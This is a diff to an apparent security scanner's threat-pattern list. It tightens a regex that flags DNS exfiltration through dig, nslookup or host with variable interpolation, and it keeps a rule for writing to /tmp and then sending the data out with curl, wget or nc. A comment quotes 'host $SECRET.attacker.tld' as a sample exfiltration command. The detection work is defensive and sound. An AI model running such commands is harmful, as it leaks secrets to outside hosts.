@@ -169,9 +169,13 @@ THREAT_PATTERNS = [
      "reads secret via Ruby ENV[]"),
 
     # ── Exfiltration: DNS and staging ──
-    (r'\b(dig|nslookup|host)\s+[^\n]*\$',
+    # DNS exfiltration requires a DNS CLI command in a shell-command context.
+    # Keep this anchored to line start or shell metacharacters so prose such as
+    # "your host skill loader ... ${skills.join(...)}" in JS template strings
+    # does not look like `host $SECRET.attacker.tld`.
+    (r'(?:^|[;&|`(])\s*(dig|nslookup|host)\s+(?:-[^\s]+\s+)*[^\n]*\$\{?\w+',
      "dns_exfil", "critical", "exfiltration",
-     "DNS lookup with variable interpolation (possible DNS exfiltration)"),
+     "DNS lookup command with variable interpolation (possible DNS exfiltration)"),
     (r'>\s*/tmp/[^\s]*\s*&&\s*(curl|wget|nc|python)',
      "tmp_staging", "critical", "exfiltration",
      "writes to /tmp then exfiltrates"),
